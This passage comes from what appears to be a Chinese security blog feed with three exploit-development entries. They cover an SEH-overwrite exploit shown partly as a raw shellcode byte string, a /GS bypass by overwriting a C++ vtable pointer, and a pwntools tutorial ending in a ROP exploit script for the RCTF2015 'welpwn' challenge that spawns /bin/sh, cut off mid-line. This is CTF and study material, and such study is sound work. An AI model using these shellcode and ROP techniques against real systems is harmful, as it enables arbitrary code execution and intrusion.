72\x73\x20\x68\x74\x72\x61\x74\x68\x69\x6e\x69\x73\x68\x20\x41\x64\x6d\x68\x72\x6f\x75\x70\x68\x63\x61\x6c\x67\x68\x74\x20\x6c\x6f\x68\x26\x20\x6e\x65\x68\x44\x44\x20\x26\x68\x6e\x20\x2f\x41\x68\x72\x6f\x4b\x33\x68\x33\x6e\x20\x42\x68\x42\x72\x6f\x4b\x68\x73\x65\x72\x20\x68\x65\x74\x20\x75\x68\x2f\x63\x20\x6e\x68\x65\x78\x65\x20\x68\x63\x6d\x64\x2e\x89\xe5\xfe\x4d\x53\x31\xc0\x50\x55\xff\xd7\xe9\x39\xff\xff\xff\x90\x90\x90\xeb\xf6\x90\x90\x31\x12\x40&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们把返回地址覆盖为\x90\x90\x90\x90了，而这这地址不可执行，程序抛出异常。在pop pop retn指令地址下断点</p><p><img src="/.io//image-20240213003830775.png" alt="image-20240213003830775"></p><p>00401231  . 59       POP ECX</p><p>   然后Shift+F9把异常交给SEH 处理。程序会断在0x00401231处。</p><p>   00401233  . C3       RETN</p><p>   此时的esp为0x0018f328</p><p><img src="/.io//image-20240213003952420.png" alt="image-20240213003952420"></p><p> 也就说是接下来程序会到0x0018ff78执行。我们按下F8</p><p><img src="/.io//image-20240213004026045.png" alt="image-20240213004026045"></p><p>这个就是nseh处的跳转指令，它又跳到nseh前八个字节处【注意当前指令地址0x0018ff78和jmp的目标地址0x0018ff70】继续F8。</p><p><img src="/.io//image-20240213004055170.png" alt="image-20240213004055170"></p><p>又是一个跳转，这回跳到我们的shellcode，f8</p><p><img src="/.io//image-20240213004204445.png" alt="image-20240213004204445"></p><p>放行程序，成功。</p><p><img src="/.io//image-20240213004322862.png" alt="image-20240213004322862"></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>突破GS</title>
      <link href="/2024/03/09/%E7%AA%81%E7%A0%B4GS/"/>
      <url>/2024/03/09/%E7%AA%81%E7%A0%B4GS/</url>
      
        <content type="html"><![CDATA[<h1 id="突破GS"><a href="#突破GS" class="headerlink" title="突破GS"></a>突破GS</h1><p>针对缓冲区溢出覆盖函数返回地址这一特征，微软在编译程序时候使用了一个很酷的安全编译选项—GS。&#x2F;GS 编译选项会在函数的开头和结尾添加代码来阻止对典型的栈溢出漏洞（字符串缓冲区）的利用。当应用程序启动时，程序的 cookie（4 字节（dword），无符号整型）被计算出来（伪随机数）并保存在 加载模块的.data 节中,在函数的开头这个 cookie 被拷贝到栈中，位于 EBP 和返回地址的正前方（位于返回地址和局部变量的中间）。</p><p>   [局部变量 ] [cookie] [保存的EBP] [保存的返回地址] [参数]</p><p>   在函数的结尾处，程序会把这个 cookie 和保存在.data 节中的 cookie 进行比较。 如果不相等，就说明进程栈被破坏，进程必须被终止。</p><p><img src="/.io//image-20240213211728720.png" alt="image-20240213211728720"></p><p>为了演示覆盖虚表指针这种技术，将使用下面的代码:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestClass</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> __declspec(noinline) <span class="built_in">test1</span>(<span class="type">char</span>* src)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> buf[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line">        <span class="built_in">strcpy</span>(buf, src);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">test2</span>();   <span class="comment">//调用虚函数test2</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">virtual</span> <span class="type">void</span> __declspec(noinline) <span class="built_in">test2</span>()</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> str[<span class="number">8000</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">LoadLibrary</span>(_T(<span class="string">&quot;Netfairy.dll&quot;</span>));</span><br><span class="line"></span><br><span class="line">    TestClass test;</span><br><span class="line"></span><br><span class="line">    test.<span class="built_in">test1</span>(<span class="string">&quot;AAAABBBBCCCCDDD&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TestClass对象在 main 函数的堆栈中分配空间，并在 main 函数中被调用，然后对象test被做为参数传递给存在 漏洞的成员函数 test1（如果把大于 8 字节的字符串拷贝到 buf，buf 就会被溢出。）。 完成拷贝后，一个虚函数会被执行，因为前边的溢出，堆栈中指向虚函数表的指针可能已经被覆盖，这样 就可以把程序的执行流重定向到 shellcode 中。</p><p> 用Olldbg载入程序，查看test1函数的代码</p><p><img src="/.io//image-20240213212349339.png" alt="image-20240213212349339"></p><p> test1函数是受到GS保护的函数，在</p><p>   <strong>00401006 A1 18304000  mov   eax, dword ptr ds:[test.__security_cookie]</strong></p><p>   <strong>0040100B   33C5     xor   eax, ebp</strong></p><p>   <strong>0040100D   8945 FC    mov   dword ptr ss:[ebp-4], eax</strong></p><p>   设置安全cookie。在</p><p>   <strong>0040105E   E8 54000000  call  test.__security_check_cookie</strong></p><p>进行检验，如果栈中的cookie被覆盖，那么程序将直接退出。但是我们注意到，在调用校验函数的时候，test1函数先调用了test2函数</p><p> <strong>00401057  FFD0  call  eax      ; test.TestClass::test2</strong></p><p><img src="/.io//image-20240213212456073.png" alt="image-20240213212456073"></p><p>而test2是虚函数，所以我们可以覆盖保存在栈中的虚表指针，间接跳到我们的shellcode。我们先执行到</p><p>   **00401050   8B10     mov   edx, dword ptr ds:[eax]**观察此时的eax为0x0018FF40，这个地址保存着虚表指针。</p><p><img src="/.io//image-20240213212735125.png" alt="image-20240213212735125"></p><p>再执行到 <strong>00401057 FFD0  call  eax    ;test.TestClass::test2</strong></p><p><img src="/.io//image-20240213212900377.png" alt="image-20240213212900377"></p><p>当输入“AAAABBBBCCCCDDD”时，刚刚开始覆盖到返回地址。如果我们输入很多字符的时候，多到恰好能覆盖虚表指针那么我们就能控制程序。我们可以计算出多少字符能够覆盖到虚表指针</p><p>X&#x3D;0x0018ff40-0x0018dfe4&#x3D;0x1f60，十进制就是8028。我们可以试一下，把test.test1(“AAAABBBBCCCCDDD”);中的AAAABBBBCCCCDDD改为8028个A。重新编译，用OD调试，执行到</p><p>   <strong>00401057   FFD0     call  eax</strong></p><p><img src="/.io//image-20240213213531916.png" alt="image-20240213213531916"></p><p> 可以看到8028个A刚好能覆盖到虚表指针。接下来就是构造利用了。找一个地址，这个地址保存的值指向我们的A。我们最好在没有开启ASLR的模块找，Netfairy.dll就是一个不错的选择。很快，我用Olldbg的搜索功能找到了一个</p><p><img src="/.io//image-20240213213630519.png" alt="image-20240213213630519"></p><p>0x500295A2保存的0x0018E1E8指向我们的AAAAAA…。下来我们把虚表指针覆盖为0x500295A2，把8028个A替换为我们的shellcode，不足的用\x90补充。务必记住，把shellcode放在0x0018E1E8之后，否则利用失败。</p><p>尽管堆栈中的 cookie 被破坏了，但我们依然劫持了 E I P（因为我们溢出了虚函数表指针，并控制了 eax），从而控制了程序的流程，执行了我们的shellcode。</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Pwntools</title>
      <link href="/2024/03/09/Pwntools/"/>
      <url>/2024/03/09/Pwntools/</url>
      
        <content type="html"><![CDATA[<h1 id="基于pwntools编写pwn代码"><a href="#基于pwntools编写pwn代码" class="headerlink" title="基于pwntools编写pwn代码"></a>基于pwntools编写pwn代码</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>pwntools是一个CTF框架和漏洞利用开发库，用Python开发，由rapid设计，旨在让使用者简单快速的编写exploit。</p><p><strong>1.Pwntools安装及模块（已装）</strong></p><p>1）安装</p><p>安装命令：pip install –upgrade pwntools</p><p>安装完毕后在python环境下只需使用 from pwn import * 即可导入</p><p>这会将大量的功能导入到全局命名空间，然后我们就可以直接使用单一的函数进行汇编、反汇编、pack,unpack等操作。</p><p>2）常用模块如下</p><p>asm：汇编与反汇编，支持x86&#x2F;x64&#x2F;arm&#x2F;mips&#x2F;powerpc等基本上所有的主流平台</p><p>dynelf：用于远程符号泄漏，需要提供leak方法</p><p>elf：对elf文件进行操作</p><p>gdb：配合gdb进行调试</p><p>memleak：用于内存泄漏</p><p>shellcraft：shellcode的生成器</p><p>tubes：包括tubes.sock,tubes.process, tubes.ssh, tubes.serialtube，分别适用于不同场景的PIPE</p><p>utils：一些实用的小功能，例如CRC计算，cyclic pattern等</p><p><strong>2.常用模块详细介绍</strong></p><p><strong>1）Tubes读写接口</strong></p><p>这是exploit最为基础的部分，对于一次攻击而言前提就是与目标服务器或者程序进行交互，这里就可以使用remote（address, port）产生一个远程的socket然后就可以读写了。</p><p>先来看看pwntools建立连接的功能，在kali上开启ftp服务：</p><p>service vsftpd start</p><p><img src="/.io//image-20240210144725321.png" alt="image-20240210144725321"></p><p>这里是模拟了使用anonymous用户登录ftp服务的场景</p><p>pwntools还有创建监听器的功能，如下所示</p><p><img src="/.io//image-20240210144749507.png" alt="image-20240210144749507"></p><p>上图中是自动监听41375端口，然后模仿发送hello消息，然后使用recv()进行接收。</p><p>通过pwnlib.tubes.process可以与进程进行交互</p><p><img src="/.io//image-20240210144849721.png" alt="image-20240210144849721"></p><p>上图中是与&#x2F;bin&#x2F;sh进行交互，打印hello world</p><p>我们不单单可以通过编程的方式事先写好与进程交互的逻辑，还可以直接与进程交互</p><p><img src="/.io//image-20240210144917152.png" alt="image-20240210144917152"></p><p>上图中通过interactive()进入了交互模式</p><p>无论哪种PIPE都是继承tube而来，可以用于读写函数主要有:</p><p>interactive()：直接进行交互，相当于回到shell的模式，在取得shell之后使用</p><p>recv(numb&#x3D;4096, timeout&#x3D;default)：接收指定字节</p><p>recvall()：一直接收直到EOF</p><p>recvline(keepends&#x3D;True)：接收一行，keepends为是否保留行尾的\n</p><p>recvuntil(delims, drop&#x3D;False)：一直读到delims的pattern出现为止</p><p>recvrepeat(timeout&#x3D;default)：持续接受直到EOF或timeout</p><p>send(data)：发送数据</p><p>sendline(data)：发送一行数据，相当于在数据末尾加\n</p><p><strong>2）汇编与反汇编</strong></p><p>使用asm进行汇编</p><p><img src="/.io//image-20240210144958929.png" alt="image-20240210144958929"></p><p>使用disasm进行反汇编</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span> disasm(<span class="string">&#x27;6a0258cd80ebf9&#x27;</span>.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20240210145024530.png" alt="image-20240210145024530"></p><p><strong>3）shellcode生成器</strong></p><p>使用shellcraft可以生成对应的架构的shellcode代码，直接使用链式调用的方法就可以得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span> shellcraft.i386.nop().strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> shellcraft.i386.linux.sh()</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20240210145241417.png" alt="image-20240210145241417"></p><p>如上所示，如果需要在64位的Linux上执行&#x2F;bin&#x2F;sh就可以使用shellcraft.amd64.linux.sh()，配合asm函数就能够得到最终的pyaload了。</p><p>除了直接执行sh之外，还可以进行其它的一些常用操作例如提权、反向连接等等。</p><p><strong>4）elf文件操作</strong></p><p>在进行elf文件逆向的时候，总是需要对各个符号的地址进行分析，elf模块提供了一种便捷的方法能够迅速的得到文件内函数的地址，plt位置以及got表的位置</p><p>下图分别是打印文件装载的基地址、函数地址、GOT表的地址、PLT表的地址</p><p><img src="/.io//image-20240210145319039.png" alt="image-20240210145319039"></p><p>其他可用的函数还包括：</p><p>asm(address, assembly)：在指定地址进行汇编</p><p>bss(offset)：返回bss段的位置，offset是偏移值</p><p>checksec()：对elf进行一些安全保护检查，例如NX,PIE等。</p><p>disasm(address, n_bytes)：在指定位置进行n_bytes个字节的反汇编</p><p>offset_to_vaddr(offset)：将文件中的偏移offset转换成虚拟地址VMA</p><p>vaddr_to_offset(address)：与上面的函数作用相反</p><p>read(address, count)：在address(VMA)位置读取count个字节</p><p>write(address, data)：在address(VMA)位置写入data</p><p>section(name)：dump出指定section的数据</p><p><strong>5）ROP链生成器</strong></p><p>回顾一下ROP的原理，由于NX开启不能在栈上执行shellcode，我们可以在栈上布置一系列的返回地址与参数，这样可以进行多次的函数调用，通过函数尾部的ret语句控制程序的流程，而用程序中的一些pop&#x2F;ret的代码块(称之为gadget)来平衡堆栈。其完成的事情无非就是放上&#x2F;bin&#x2F;sh，覆盖程序中某个函数的GOT为system的，然后ret到那个函数的plt就可以触发system(‘&#x2F;bin&#x2F;sh’)。由于是利用ret指令的exploit，所以叫Return-Oriented Programming。</p><p>这种技术的难点自然就是如何在栈上布置返回地址以及函数参数。而pwntools的ROP模块的作用，就是自动地寻找程序里的gadget，自动在栈上部署对应的参数。</p><p>使用ROP(elf)来产生一个rop的对象，这时rop链还是空的，需要在其中添加函数</p><p><img src="/.io//image-20240210145421362.png" alt="image-20240210145421362"></p><p>ROP对象实现了__getattr__的功能，可以直接通过func call的形式来添加函数，rop.read(0, elf.bss(0x80))实际相当于rop.call(‘read’, (0, elf.bss(0x80)))。通过多次添加函数调用，最后使用str将整个rop chain dump出来就可以了。</p><p><img src="/.io//image-20240210145440379.png" alt="image-20240210145440379"></p><p>其他常用函数包括：</p><p>call(resolvable, arguments&#x3D;())：添加一个调用，resolvable可以是一个符号，也可以是一个int型地址，注意后面的参数必须是元组否则会报错，即使只有一个参数也要写成元组的形式(在后面加上一个逗号)</p><p>chain()：返回当前的字节序列，即payload</p><p>dump()：直观地展示出当前的ropchain</p><p>raw()：在rop chain中加上一个整数或字符串</p><p>search(move&#x3D;0, regs&#x3D;None, order&#x3D;’size’)：按特定条件搜索gadget，没仔细研究过</p><p>unresolve(value)：给出一个地址，反解析出符号</p><p>另外，对于整数的pack与数据的unpack，可以使用p32,p64,u32,u64这些函数，分别对应着32位和64位的整数</p><h2 id="使用pwntools实战CTF题目"><a href="#使用pwntools实战CTF题目" class="headerlink" title="使用pwntools实战CTF题目"></a><strong>使用pwntools实战CTF题目</strong></h2><p>题目来自RCTF2015,名为welpwn</p><p>先看看程序的基本信息</p><p><img src="/.io//image-20240210145925577.png" alt="image-20240210145925577"></p><p>可以知道，这是64位linux下的二进制程序，无cookie</p><p>通过IDA静态分析</p><p><img src="/.io//image-20240210150053429.png" alt="image-20240210150053429"></p><p>main函数</p><p><img src="/.io//image-20240210150109984.png" alt="image-20240210150109984"></p><p><img src="/.io//image-20240210150116727.png" alt="image-20240210150116727"></p><p>read()函数读取字节数为0x400,即十进制的1024，即read()读取1024个字节的数据，随后调用echo()</p><p>定位到echo()</p><p><img src="/.io//image-20240210150140123.png" alt="image-20240210150140123"></p><p>可以看到echo函数的栈帧大小为20h</p><p>echo的伪码</p><p><img src="/.io//image-20240210150152033.png" alt="image-20240210150152033"></p><p>可以知道，echo函数中存在循环赋值，循环的次数为read函数读的数据的长度</p><p>由于echo函数的栈桢大小（20h）远小于read函数可以读取的数据长度(400h)，在进行循环赋值的时候，echo函数保存在栈中的返回地址会被覆盖。</p><p>整个程序逻辑是这样的，main函数中，用户可以输入1024个字节，并通过echo函数将输入复制到自身栈空间，但该栈空间很小，使得栈溢出成为可能。由于复制过程中，以“x00”作为字符串终止符，故如果我们的payload中存在这个字符，则不会复制成功；但实际情况是，因为welpwn的NX为enabled,即设置了栈不可执行，所以我们需要构造ROP链，这样肯定会在payload中包含“x00”字符。</p><p>那么怎么绕过这个障碍呢？</p><p>由于echo函数的栈空间很小，与main函数栈中的输入字符串之间只间隔32字节（0x20h），故我们可以只复制过去24字节数据加上一个包含连续4个pop指令的gadget地址(8字节)，并借助这个gadget跳过原字符串的前32字节数据，即可进入我们正常的通用gadget调用过程。</p><p>绕过这个障碍后，解题思路就很清晰了：</p><p>-泄露libc，获取system,gets等函数地址</p><p>-构造gets(bss);将’&#x2F;bin&#x2F;sh’写入bss段</p><p>-构造’system(“&#x2F;bin&#x2F;sh”)’得到shell</p><p>使用ROPgadgets寻找gadgets，用于构造ROP链条</p><p>ROPgadget –binary .&#x2F;welpwn –only “opo|ret”</p><p><img src="/.io//image-20240210150355752.png" alt="image-20240210150355752"></p><p>找到main函数地址，用作返回地址</p><p>objdump -d welpwn | grep main</p><p><img src="/.io//image-20240210150427028.png" alt="image-20240210150427028"></p><p>bss段开始地址，用于存储字符串(‘&#x2F;bin&#x2F;sh’)</p><p>readelf -S welpwn | grep bss</p><p><img src="/.io//image-20240210150505608.png" alt="image-20240210150505608"></p><p>puts（plt）地址，用于泄露内存</p><p>objdump -d welpwn | grep puts</p><p><img src="/.io//image-20240210150544260.png" alt="image-20240210150544260"></p><p>构造ROP链，泄露内存</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rop = p64(poprdi) + p64(addr) +p64(puts_plt) + p64(main)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">24</span> + p64(ppppr) +rop</span><br></pre></td></tr></table></figure><p>利用pwnlib中DynELF模块泄露libc中system和puts地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr</span>):</span><br><span class="line"></span><br><span class="line">rop = p64(poprdi) + p64(addr) + p64(puts_plt) + p64(main)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">24</span> + p64(ppppr) + rop</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">27</span>)</span><br><span class="line"></span><br><span class="line">tmp = p.recv()</span><br><span class="line"></span><br><span class="line">data = tmp.split(<span class="string">&quot;\nWelcome&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">len</span>(data):</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">return</span> <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">&#x27;welpwn&#x27;</span>))</span><br><span class="line"></span><br><span class="line">system = d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gets = d.lookup(<span class="string">&#x27;gets&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br></pre></td></tr></table></figure><p>构造ROP链将’&#x2F;bin&#x2F;sh’写入bss段，并执行system(“&#x2F;bin&#x2F;sh”):</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rop = p64(poprdi) + p64(bss) + p64(gets) +p64(poprdi) + p64(bss) + p64(system) + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">24</span> + p64(ppppr) +rop</span><br></pre></td></tr></table></figure><p>运行后如图所示，拿到shell</p><p><img src="/.io//image-20240210150719044.png" alt="image-20240210150719044"></p><p><img src="/.io//image-20240210150728857.png" alt="image-20240210150728857"></p><p>完整代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;welpwn&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;welpwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read_got = elf.symbols[<span class="string">&#x27;got.read&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;read_got = &quot;</span> + <span class="built_in">hex</span>(read_got))</span><br><span class="line"></span><br><span class="line">write_got = elf.symbols[<span class="string">&#x27;got.write&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;write_got = &quot;</span> + <span class="built_in">hex</span>(write_got))</span><br><span class="line"></span><br><span class="line">main = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;main = &quot;</span> + <span class="built_in">hex</span>(main))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buflen = <span class="number">24</span></span><br><span class="line"></span><br><span class="line">mmmcall = <span class="number">0x400880</span></span><br><span class="line">ppppppr = <span class="number">0x40089a</span></span><br><span class="line">ppppr = <span class="number">0x40089c</span></span><br><span class="line"></span><br><span class="line">padding = <span class="number">0xdeadbeef</span></span><br><span class="line"></span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">address</span>):</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    payload = <span class="string">&quot;&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;Q&quot;</span> * buflen</span><br><span class="line">    payload += p64(ppppr)       </span><br><span class="line">    payload += p64(ppppppr)</span><br><span class="line">    rbx = <span class="number">0</span></span><br><span class="line">    rbp = <span class="number">1</span></span><br><span class="line">    r12 = write_got</span><br><span class="line">    r13 = <span class="number">8</span></span><br><span class="line">    r14 = address</span><br><span class="line">    r15 = <span class="number">1</span></span><br><span class="line">    ret = mmmcall</span><br><span class="line">    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(ret)</span><br><span class="line">    ret = main</span><br><span class="line">    payload += p64(padding) * <span class="number">7</span> + p64(ret)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;RCTF\n&#x27;</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        p.recv(<span class="number">0x1b</span>)</span><br><span class="line">    data = p.recv(<span class="number">8</span>)</span><br><span class="line">    log.info(<span class="string">&quot;recv: &quot;</span> + <span class="built_in">str</span>(data))</span><br><span class="line">    flag += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">&#x27;welpwn&#x27;</span>))</span><br><span class="line"></span><br><span class="line">system = d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&quot;system addr = &quot;</span> + <span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x601300</span></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += <span class="string">&quot;P&quot;</span> * buflen</span><br><span class="line">payload += p64(ppppr)</span><br><span class="line">payload += p64(ppppppr)</span><br><span class="line">rbx = <span class="number">0</span></span><br><span class="line">rbp = <span class="number">1</span></span><br><span class="line">r12 = read_got</span><br><span class="line">r13 = <span class="number">17</span></span><br><span class="line">r14 = bss</span><br><span class="line">r15 = <span class="number">0</span></span><br><span class="line">ret = mmmcall</span><br><span class="line">payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(ret)</span><br><span class="line">ret = main</span><br><span class="line">payload += p64(padding) * <span class="number">7</span> + p64(ret)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;RCTF\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh\0&quot;</span>+ p64(system))</span><br><span class="line"></span><br><span class="line">check = <span class="string">&quot;&quot;</span></span><br><span class="line">check += <span class="string">&quot;C&quot;</span> * buflen</span><br><span class="line">check += p64(ppppr)</span><br><span class="line">check += p64(ppppppr)</span><br><span class="line">rbx = <span class="number">0</span></span><br><span class="line">rbp = <span class="number">1</span></span><br><span class="line">r12 = write_got</span><br><span class="line">r13 = <span class="number">16</span></span><br><span class="line">r14 = 